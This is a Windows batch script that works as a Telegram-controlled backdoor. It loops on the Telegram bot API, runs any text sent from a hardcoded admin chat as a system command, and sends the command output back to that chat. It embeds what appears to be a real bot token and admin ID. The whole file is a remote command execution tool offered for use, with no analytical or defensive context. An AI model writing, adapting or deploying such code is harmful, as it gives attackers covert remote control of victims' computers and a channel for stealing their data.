@echo off
set BOT_TOKEN=8305631464:AAGthjFVJx1_LHLElVvOwxhyMPQM0i7mhS8
set ADMIN_ID=7006722745
set API_URL=https://api.telegram.org/bot%BOT_TOKEN%

:loop
for /f "tokens=*" %%i in ('curl -s -X POST "%API_URL%/getUpdates" -d offset=0 -d timeout=30') do (
    set RESPONSE=%%i
)

echo %RESPONSE% | findstr "update_id" >nul
if not errorlevel 1 (
    for /f "tokens=2 delims=:" %%a in ('echo %RESPONSE% ^| findstr "text"') do (
        set COMMAND=%%a
        set COMMAND=!COMMAND:~1,-2!
    )
    
    for /f "tokens=2 delims=:" %%b in ('echo %RESPONSE% ^| findstr "chat"') do (
        set CHAT_ID=%%b
        set CHAT_ID=!CHAT_ID:~1,-1!
    )
    
    if "!CHAT_ID!"=="%ADMIN_ID%" (
        for /f "tokens=*" %%c in ('!COMMAND! 2^>^&1') do (
            set OUTPUT=%%c
        )
        
        if "!OUTPUT!"=="" set OUTPUT=Команда выполнена.
        
        curl -s -X POST "%API_URL%/sendMessage" -d chat_id="%ADMIN_ID%" -d text="!OUTPUT!" >nul
    )
)

timeout /t 1 /nobreak >nul
goto loop
